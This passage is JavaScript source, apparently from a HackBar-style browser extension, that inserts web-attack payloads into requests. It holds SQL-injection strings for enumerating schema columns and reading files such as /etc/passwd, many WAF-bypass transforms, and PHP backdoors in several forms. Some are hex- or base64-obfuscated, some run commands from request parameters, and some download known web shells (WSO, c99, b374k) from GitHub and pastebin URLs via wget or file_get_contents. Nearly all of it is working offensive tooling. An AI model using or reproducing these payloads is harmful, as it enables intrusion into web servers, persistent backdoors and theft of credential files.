                    txt = "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x" + tblNameHex + ")";
                    break;		
                }
		hackBar.setSelectedText( txt );
	  },
	/* BASICS OTHER */
    OtherBasics: function (choice)	{
		var str = choice;
		switch (str){
			case 'OtherBasics1':
					var txt = hackBar.getSelectedText();
					if( txt == ''){
					var txt = "LPAD(str,2,0x30)";
					}else{
					var txt = "LPAD(" + txt + ",2,0x30)";
					};
					break;
			case 'OtherBasics2':
					var txt = hackBar.getSelectedText();
					if( txt == ''){
					var txt = "REPEAT(str,count)";
					}else{
					var txt = "REPEAT(" + txt + ",5)";
					};
					break;
			case 'OtherBasics3':
					var txt = hackBar.getSelectedText();
					if( txt == ''){
					var txt = "IF((CONDITION)>-1,0x00,0x00)";
					}else{
					var txt = "IF((" + txt + ")>-1,0x00,0x00)";
					};
                    break;
			case 'OtherBasics4':
					var txt = hackBar.getSelectedText();
					if( txt == ''){
					var txt = "CASE+WHEN+(CONDITION)+THEN+1+ELSE+2+END";
					}else{
					var txt = "CASE+WHEN+(" + txt + ")+THEN+1+ELSE+2+END";
					};
                    break;
            default:
                    txt = "ERROR";
                    break;
		}
		hackBar.setSelectedText( txt );
	  },
	phpscripts: function (choice)	{
	var str = choice;
	var wso = "https://raw.githubusercontent.com/tennc/webshell/master/xakep-shells/PHP/wso.txt";
	switch (str){
		case 'phpscripts1':
				txt = "0x3c3f706870206563686f202755706c6f616465723c62723e273b6563686f20273c62723e273b6563686f20273c666f726d20616374696f6e3d2222206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d6461746122206e616d653d2275706c6f61646572222069643d2275706c6f61646572223e273b6563686f20273c696e70757420747970653d2266696c6522206e616d653d2266696c65222073697a653d223530223e3c696e707574206e616d653d225f75706c2220747970653d227375626d6974222069643d225f75706c222076616c75653d2255706c6f6164223e3c2f666f726d3e273b69662820245f504f53545b275f75706c275d203d3d202255706c6f6164222029207b69662840636f707928245f46494c45535b2766696c65275d5b27746d705f6e616d65275d2c20245f46494c45535b2766696c65275d5b276e616d65275d2929207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d656c7365207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d7d3f3e";
				break;
		case 'phpscripts2':
				var password = alert(' Password = raz');
				txt = "0x3c3f706870a24735f3d27654e71565574464b777a415566522f7348364a37585a7a62524346746830777369744d48465747796c7a533557344e7055744c4d7259723964704e315a534a39304874656b707837376a6b4a43564f6279556d33457861326c4f41576965596c2b6b514a5a5738726f39654b5936616c4e715233757173413164744e4b697745614b6d567855756143566d53467a43634b726f2f4c4d51486b4f45773377626f713973524b6c2f62766f577470515a6f7677414a7a4471622f6578345630474c36796a326349773248417878383143687065436f64785a372f443143592b356366307175394e6f494d4b3053656b6834486e734579452f42484a673231417174694e4c71483839415361726677527a47587351656454376574326b547270614e764d7a315738476f7846534b6c534b5a3446784372666a56506d357553684d4a6a6f49737479566d49475642696c527641736564434c5673745138487a5138496a7a432b70787a517445525639586a35576c58484748754367624a672f436f316b7a435a524e46694d6236626f756662687a6c3675726d657a644230336d674767796a7966642b532b4d677a273ba6563686f28677a756e636f6d7072657373286261736536345f6465636f64652824735f2929293ba6572726f725f7265706f7274696e672830293ba6f625f737461727428293ba2f2f54494e59205348454c4c20207631204279207e7e52405a7e7ea24706173733d273833666533373462353331616363303837636130316232633635383435333839273b2f2f2044656661756c7420506173732069732072617a202020284368616e67652049742029a2473683d27654e727457473176347a59532f7077412b5138735431664a4238666162467373594676714f596d6342707533576b6d42765767684b4259644353744c676967356d797479763733444966566978386c757237312b757353577865484d63446a7a44446c6b7644435734512b47356c39647574653365683577726e2f73575a596d336e712f37753375634d5a356e4b552b4c344f694e486f6a49476d2b36376a75366556464c53445a6f657470622f6335663777775973355a615479543677375534547078774a51774c6f4142545143654d694957366659494f35355977686e382f6b7267723261365a2b5838495a5347506e574565566e3442637554594d344d33665030766d377166657a736a586232647257715349444c2b495974382f4952545a333934737875395a2b757236396359516e356b64436f4c484d2b4e45303661426e6b723338784f5866306a7833367a506e35786e47762f5a765a71663652444b5877667950626f514e31397346337232656e4679666f4179334f3054477434506e6c74654e506a6f396e304b3978567178597363616868717735466e4843724c62333671637265442b626f6e49526b6a543277614f477a6f4d463835645a7948534d4364466349466a30386f4b4b73497441644b6e544b5a566f304f3465533862426744446d6e2f7846775a6a50637845434f71433945644634374f6346573853666753556f69754452495071683369663665337965342f4d456e396634645044354c33782b4f4e524a62365464425a79422b4d476274392b5074486b4365494c574d6b344e734c37734a646d396f617a6f452b54747763733871314b41576a4e386a2b7954413944463433387a692b63465343344d2f6538486737634c4865565167556e79374d46414a58303545734269514854344833546d63697637774c7346573259723567736e742f6774524c50322f5670734f743758324370494c4142746e484e51466a46654a34626f41447743783263326c38422b7a674e64794c4e6148337256444d334375477a70324254304b67325767762b66655a5437324444305142654f79533336625872483839477a4a78317079302b516c4b3036624459516b6c6d4e4e4a58502b4735683867306f4a7353476d45424f73567a546955324a2b59706267456c2f586855465330752f4170526a76724e356c4a48786550782b4d727559374f324f6f384b324c4d3837444867384a394d716e5a65774d48485474437a524e623644727a6b484461797733512f757458502b6e364630414d7832684e33777659486743446f5878436b416d4c674377454f45697143354d73644f72345971335154784b496c424d524c6a48416a494f4a6b3635507a79324c45775463626d6f533137504d386242795143374667555166456a2b7879583144374c37724f71484a7542625a71314f654e4656697a4a6b705652466c6f553345424a67504f797841706d7578464c45754a412b49637951754d347a6175536c4938353547584a50674f2f6d4b46464255536f7664624e7137736c6a4573415942553048636c686968472f4e4b34444d676241742f66465959487879384e574a6676616b59384b4670534d484d6646384d5642455667626f305a78474c4b303568443974514749793964746c494e756d4d6741594d6938724a49797a6d4837773937394d436744326b77677a336737412f6f3361742f6b535261455a417078332b5938675966617967705a587a66747075615270676e67495a77563047754c425a5255666b78507a7743586b34764a69544d54795545774f3872674c6d48774931346a425651306b6c7a4944494850324951753058334d456c617970766c4c7a4236517436453459726c5a6f36417146334b6f6f56797859696b6272306538546f576a4b456a765a6553464c53384676784e616a4f7a7267555764644d314e384e33627854566c625548443071473374777372326a794351525246726c34677a594a3552497a374a4c737a3644396f6a77536359484a7a4b61506c4d4632785534454673495162376161547764346d474a484255444b3950746e2f58696a584672684849525665444c6c69634e6f7a63514f734755427841587463614d686d2f304256597172586c76756c58493633436143322f747665674a4c7a51377057626347336c5a45767750566563536b58345a37584749387a4a75533538776a42446f4a4c4e35566f432b31364e5a534c345572574b4b6a713232626a73435542555268417645424d474e445274616d6e324b356e686e76303739447a676a3043394c3944433236357a37574952486c566930695a66656c316d59466265435332366d35344649726e5354786b48502f762b622f61382f43706b774f58697a386a4e78727a54616d7547357576694d73533566397758466f74396d584f306d6236384958566d63334c7248683830615176632f784a634f34347035337356305034662b4f71763878503467504d58516c5462764630625666726e46686779307044416d68394b474a6b58652f74414c644b6b7a6a39394b776259374a446941506a47565457434f472b3357576a765936426e537341555a4f3474376f73654d54705777326d6c557435344e3167754e57687778636250683452674c4553664f4b6b686f65594c514b53575979765a6f4647795834577176304c74505937353551713738354c2b7447394f5470795848643663336232676478636e56314f6a70316a756e56616f755a7570384a6b6f53744b414647312b364b746546416131527355713745494b3338345565446d3739487650477172516a6b6b6c31554a4263302b324b64554471696f58394c5370716f63365a67416859347959556538512f32414a546e656c327a7772745a514141564e4b4647773673526645365757465a584c424f724c75497a68444370366654796767516c41355931456655594474494a5541427168356e6a674d4a2b33503367554475574a6544393438385a54785a75486c527a4d4659634278436f784143335a4d425a58395332516c665157503641425043344d356a6d62783045796a344a697139464b5567464547643474545430733572326d4f76556f5745704848573552507172436534332b7836652f4d55696e7050565554657656526131487366716567476663594d573874726f314f3761424a3945486350546b6e646d6a337a714a4b65384a68534871646735384b70774e4d46356b734b41707762372b6f45735561796c37384a58584e363471316e534e56425975554a73686c66596261586c7a734c4f4463395a6c4c6f44447367494f4348416f54326c377843444857636f474b6750414f385330645946757641376355566456323155564c4f77716d67627744463955745a676e4761394e565a6d326d664c71326b4d6d4844595572552f6576487633726b2f4b6f6b4a5a61513646565a366377774a453647626d3467375558585752304b4858577942704e4d6e3967734443674577447571394f617548472f746c647a3042424b3371526c515276524d6c514e3759766176574e5531776a6f726b7944686b4550487555643745524c422b734d50516b6d7763695734623641506642316d2b3149553163494e5071632f4c472b646d2b436a6933316b397934694c35495376432b74776e327138666c552b794a685645564a392b413174784753453d273ba6576616c28677a756e636f6d7072657373286261736536345f6465636f6465282473682929293ba3f3ea3c68723e3c68723e3d3d3d3d3d3d3d3d3d3d5468616e6b7320466f72205573696e672e3d3d3d3d3d3d3d3d3d3d3d3d3c2f626f64793ea3c2f68746d6c3e";
				break;
		case 'phpscripts3':
				txt = "<?php $a = base64_decode('PD9waHAgZWNobyAnVXBsb2FkZXI8YnI+JztlY2hvICc8YnI+JztlY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBuYW1lPSJ1cGxvYWRlciIgaWQ9InVwbG9hZGVyIj4nO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI1MCI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT4nO2lmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICc8Yj5VcGxvYWQgISEhPC9iPjxicj48YnI+JzsgfWVsc2UgeyBlY2hvICc8Yj5VcGxvYWQgISEhPC9iPjxicj48YnI+JzsgfX0/Pg==');$file = fopen('up.php','w');echo fwrite($file,$a);fclose($file);?>";
				break;
		case 'phpscripts4':
				txt = "0x3c63656e7465723e203c68313e4578656375746520636f6d6d616e64733c2f68313e203c666f726d206d6574686f643d22504f53542220616374696f6e3d22223e203c696e70757420747970653d227465787422206e616d653d22636d642220706c616365686f6c6465723d224578656375746520436f6d6d616e6473223e203c696e70757420747970653d227375626d6974222076616c75653d223e3e223e203c2f666f726d3e203c3f7068702024636d64203d20245f504f53545b27636d64275d3b202465786563203d207368656c6c5f65786563282224636d6422293b206563686f20223c746578746172656120726f77733d2731352720636f6c733d273835273e24657865633c2f74657874617265613e223b203f3e";
				break;
		case 'phpscripts5':
				var url = alert('site.com/filename.php?X=Xploit');
				txt = "<?php fwrite(fopen('up.php','w'),file_get_contents('https://pastebin.com/raw/nxuL4SNv'));?>";
				break;
    case 'php_script_get':
        txt = "<?php echo system($_POST['cmd']);?>";
        break;
		case 'php_script_post':
				txt = "<?php echo exec($_POST['cmd']);?>";
				break;

		case 'fwrite':
				txt = "<? @fwrite(fopen('hacked.txt','w'),'Hacked by ph.hitachi'); ?>";
				break;
		case 'file_get_contents':
				shell = prompt("Please Enter the filename","WSO.php");
				txt = "<? @fwrite(fopen('" + shell + "','w'),file_get_contents('" + wso + "')); ?>";
				break;
		case 'rce':
				txt = "${@fwrite(fopen('up.php','w'),file_get_contents('" + wso + "')).phpinfo(); }";
				break;
		case 'file_get_contents 2':
				var url = alert('http://localhost/get.php?f=shell.php&u=http://localhost/WSO.txt');
				txt = "<? fwrite(fopen($_GET[f], 'w'), file_get_contents($_GET[u])); ?>";
				break;
		case 'cmd_base64_get':
				var url = alert('http://localhost/cmd.php?cmd=dW5hbWUgLWE=');
				txt = "<?system(base64_decode($_GET['cmd']));?>";
				break;
    case 'cmd_base64_post':
        alert('http://localhost/cmd.php?\nPostData: cmd=dW5hbWUgLWE=');
        txt = "<?system(base64_decode($_POST['cmd']));?>";
        break;
		case 'cmd_eval_request':
            alert('http://localhost/cmd.php?cmd=phpinfo();');
						txt = "<?php @eval($_REQUEST['cmd']);?>";
				break;
    case 'cmd_eval_get':
            alert('http://localhost/cmd.php?cmd=phpinfo();');
            txt = "<?php @eval($_GET['cmd']);?>";
        break;
    case 'cmd_eval_post':
            alert('http://localhost/cmd.php?\nPostData: cmd=phpinfo();');
            txt = "<?php @eval($_POST['cmd']);?>";
        break;
    case 'cmd_eval_base64_get':
            alert('http://localhost/cmd.php?cmd=cGhwaW5mbygpOw==');
            txt = "<?php @eval(base64_decode($_GET['cmd']));?>";
        break;
    case 'cmd_eval_base64_post':
            alert('http://localhost/cmd.php?\nPostData: cmd=cGhwaW5mbygpOw==');
            txt = "<?php @eval(base64_decode($_POST['cmd']));?>";
        break;

		case 'php_info':
						txt = "<? phpinfo();?>";
				break;
		case 'system':
						txt = "<? system(\"wget "+ wso + " -O WSO.php\"); ?>";
				break;
		case 'exec':
						txt = "<? exec(\"wget "+ wso + " -O WSO.php\"); ?>";
				break;
		case 'shell_exec':
						txt = "<? shell_exec(\"wget "+ wso + " -O WSO.php\"); ?>";
				break;
		case 'passthru':
						txt = "<? passthru(\"wget "+ wso + " -O WSO.php\"); ?>";
				break;
		}
		hackBar.setSelectedText( txt );
	  },
	  shell: function (choice)	{
		var str = choice;

		switch (str){
		case 'wso':
				txt = "https://raw.githubusercontent.com/tennc/webshell/master/xakep-shells/PHP/wso.txt";
				break;
		case 'c99':
				txt = "https://raw.githubusercontent.com/tennc/webshell/master/web-malware-collection-13-06-2012/PHP/c99.txt";
				break;
		case 'b374k_mini_shell':
				txt = "https://raw.githubusercontent.com/NSAKEY/Top-103-shells/master/Top%20103%20shells/b374k-mini-shell-php.php.txt";
				break;
		case 'mini_shell':
				txt = "https://pastebin.com/raw/S6b25j4c";
				break;
	    case 'ssi':
				txt = "https://raw.githubusercontent.com/Anon-Exploiter/An0n-3xPloiTeR-Shell/master/ssi.shtml";
				break;
		case 'An0n-3xPloiTeR-Shell': alert("pass = uexploit");
				txt = "https://raw.githubusercontent.com/Anon-Exploiter/An0n-3xPloiTeR-Shell/master/Shell.php";
				break;
		case 'An0n-3xPloiTeR-mini-Shell':
				txt = "https://raw.githubusercontent.com/Anon-Exploiter/Mini-Shell/master/mini_shell.php";
				break;
		}
		
		hackBar.setSelectedText( txt );
	  },

	  load_file: function (choice)	{
	var str = choice;
	switch (str){
		case 'passwd':
						txt = "load_file('/etc/passwd')";
				break;
		case 'my.cnf':
						txt = "load_file('/etc/my.cnf')";
				break;
		case 'group':
						txt = "load_file('/etc/group')";
				break;
		case 'services':
						txt = "load_file('/etc/services')";
				break;
		case 'hosts':
						txt = "load_file('/etc/hosts')";
				break;
		case 'httpd':
						txt = "load_file('/etc/httpd/conf/httpd.conf')";
				break;
		}
		hackBar.setSelectedText( txt );
	  },
	/* T.PRO WAF CALCULATE  */
	CalcWaf: function (choice)
	  {
		var txt = hackBar.getSelectedText();
		var str = choice;
		switch (str){
/* WAF BYPASS MENUcase */
			
		//NullBytes waf
			case 'null waf 1': txt = txt.replace(/ /g, "%0A");
				txt = txt.replace(/\(/g, "%0A(");
				//txt= ("" + txt + "");
					break;
			case 'null waf 2': txt = txt.replace(/ /g, "%0b");
				txt = txt.replace(/\(/g, "%0b(");
				//txt= ("" + txt + "");
					break;
			case 'null waf 3': txt = txt.replace(/ /g, "%0d%0A");
				txt = txt.replace(/\(/g, "%0d%0A(");
				//txt= ("" + txt + "");
					break;
			case 'null waf 4': txt = txt.replace(/ /g, "%23%0A");
				txt = txt.replace(/\(/g, "%23%0A(");
				//txt= ("" + txt + "");
					break;
			case 'null waf 5': txt = txt.replace(/ /g, "%23aa%0A");
				txt = txt.replace(/\(/g, "%23aa%0A(");
				//txt= ("" + txt + "");
					break;
			case 'null waf 6': txt = txt.replace(/ /g, "%23xyz%0A");
				txt = txt.replace(/\(/g, "%23xyz%0A(");
				//txt= ("" + txt + "");
					break;
			case 'null waf 7': txt = txt.replace(/ /g, "%23foo%0D%0A");
				txt = txt.replace(/\(/g, "%23foo%0D%0A(");
				//txt= ("" + txt + "");
					break;
			case 'null waf 8': txt = txt.replace(/ /g, "%23foo*%2F*bar%0D%0A");
				txt = txt.replace(/\(/g, "%23foo*%2F*bar%0D%0A(");
				//txt= ("" + txt + "");
					break;
			case 'null waf 9': txt = txt.replace(/ /g, "#qa%0A#%0A");
				txt = txt.replace(/\(/g, "#qa%0A#%0A(");
				//txt= ("" + txt + "");
					break;
			case 'null waf 10': txt = txt.replace(/ /g, "+");
				txt= ("/*!20000%0d%0a" + txt + "*/");
					break;
			case 'null waf 11': txt = txt.replace(/ /g, "+");
				txt= ("/*!blobblobblob%0d%0a" + txt + "*/");
					break;
			case 'null waf 12': txt = txt.replace(/ /g, "+");
				txt= ("/*!f****U%0d%0a" + txt + "*/");
					break;

			
			case 'String3': txt = txt.replace(/ /g, "+");
				txt= ("/*!" + txt + "*/");
					break;
			case 'String9': txt = txt.replace(/ /g, "+");
				txt= ("/^.*" + txt + ".*$/");
					break;
			case 'String1': txt = txt.replace(/\(/g, "+--+");
				txt = txt.replace(/ /g, "+--+");
				//txt= ("+--+" + txt + "+--+");
					break;
			case 'String2': txt = txt.replace(/ /g, "/*--*/");
				txt = txt.replace(/\(/g, "/*--*/(");
				//txt= ("/*!" + txt + "*/");
					break;
			case 'String4': txt = txt.replace(/ /g, "/*&a=*/");
				txt = txt.replace(/\(/g, "/*&a=*/(");
				//txt= ("/*!" + txt + "*/");
					break;
			case 'String5': txt = txt.replace(/ /g, "/*1337*/");
				txt = txt.replace(/\(/g, "/*1337*/(");
				//txt= ("/*!" + txt + "*/");
					break;
			case 'String6': txt = txt.replace(/\(/g, "/**x**/(");
				txt = txt.replace(/ /g, "/**x**/");
				//txt= ("" + txt + "");
					break;
			case 'String7': txt = txt.replace(/\(/g, "/**_**/(");
				txt = txt.replace(/ /g, "/**_**/");
				//txt= ("" + txt + "");
					break;
			case 'String8': txt = txt.replace(/\(/g, "/**aaa**/(");
				txt = txt.replace(/ /g, "/**aaa**/");
				//txt= ("" + txt + "");
					break;
			case 'String10': 
				alert('this only work with space');
				txt = txt.replace(/\(/g, "/**/(");
				txt = txt.replace(/ /g, "/**/");
				//txt= ("" + txt + "");
					break;

	//Waf String
			case 'CalcWaf1': txt = txt.replace(/ /g, "+");
				txt= ("/*!51000" + txt + "*/");
					break;
			case 'CalcWaf2': txt = txt.replace(/ /g, "+");
				txt= ("/*!50000" + txt + "*/");
					break;
			case 'CalcWaf3': txt = txt.replace(/ /g, "+");
				txt= ("/*!12345" + txt + "*/");
					break;
			case 'CalcWaf4': txt = txt.replace(/ /g, "+");
				txt= ("/*!13337" + txt + "*/");
					break;
			case 'CalcWaf5': txt = txt.replace(/ /g, "+");
				txt= ("/*!00000" + txt + "*/");
					break;
			case 'CalcWaf6': txt = txt.replace(/ /g, "+");
				txt= ("/*!56000" + txt + "*/");
					break;
			case 'CalcWaf7': txt = txt.replace(/ /g, "+");
				txt= ("/*!50095" + txt + "*/");
					break;
			case 'CalcWaf8': txt = txt.replace(/ /g, "+");
				txt= ("/*!40122" + txt + "*/");
					break;
			case 'OverFlow': var number = prompt( "Amount of number to use in the /*!100000Union Select*/ Statement", "100000" );
			    number = Math.min(1000000, parseInt( number ));
			    txt = txt.replace(/ /g, "+");
				txt= ("/*!"+ number + txt + "*/");
					break;
			case 'cutoff': var txt = txt.toLowerCase();
				String.prototype.insert = new Function('intPos','strIns','return this.substring(0,intPos) + strIns + this.substring(intPos,this.length);');
				var input2val = txt.toUpperCase();
				txt = (txt.insert(2,input2val));
				txt = txt.replace(/ /g, "/*&a=*/");
					break;
		}
		hackBar.setSelectedText( txt );
	  },
}
